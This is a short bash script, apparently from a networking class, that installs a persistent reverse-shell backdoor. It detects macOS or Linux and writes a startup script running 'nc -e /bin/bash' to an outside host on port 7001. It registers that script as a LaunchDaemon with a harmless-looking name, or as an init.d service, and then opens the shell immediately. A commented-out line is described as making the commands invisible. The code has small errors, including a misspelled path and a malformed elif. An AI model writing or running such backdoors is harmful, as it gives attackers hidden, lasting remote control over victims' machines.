#!/bin/bash

{
    platform='unknown'
    unamestr=`uname`
    if [[ "$unamestr" == 'Linux' ]]; then
    	platform='linux'
    elif [[ "$unamestr" == 'FreeBSD' ]]; then
    	platform='freebsd'
    elif [[ "$unamestr" == 'Darwin' ]]; then
    	platform='osx'
    fi

    if [ "$platform" == "osx" ]; then
    	echo "#!/bin/bash 
    	nc -e /bin/bash claseredes2.tk 7001" > /Library/StartupItems/boot_preferences.sh
    	chmod a+x /Library/StartupItems/boot_preferences.sh
    	echo  "<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.http.request</string>
    <key>ProgramArguments</key>
    <array>
        <string>/Libray/StartupItems/boot_preferences.sh</string>
    </array>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>" > /Library/LaunchDaemons/com.http.request.plist
    launchctl load -w /Library/LaunchDaemons/com.http.request.plist #TODO Revisar que se necesite la linea 35, con esto talvez ya se ejecuta el NC.
    elif[ "$platform" == "linux" ]; then
    	echo "#!/bin/bash 
    	nc -e /bin/bash claseredes2.tk 7001" > /etc/init.d/boot_init.sh
    	chmod a+x /etc/init.d/boot_init.sh
    	update-rc.d boot_init.sh defaults
    else
    	echo "esta mal la comparacion " > $HOME/Desktop/adrian.txt
    fi
    nc -e /bin/bash claseredes2.tk 7001
} #&> /dev/null # Esto hace los comandos invisibles, descomentar

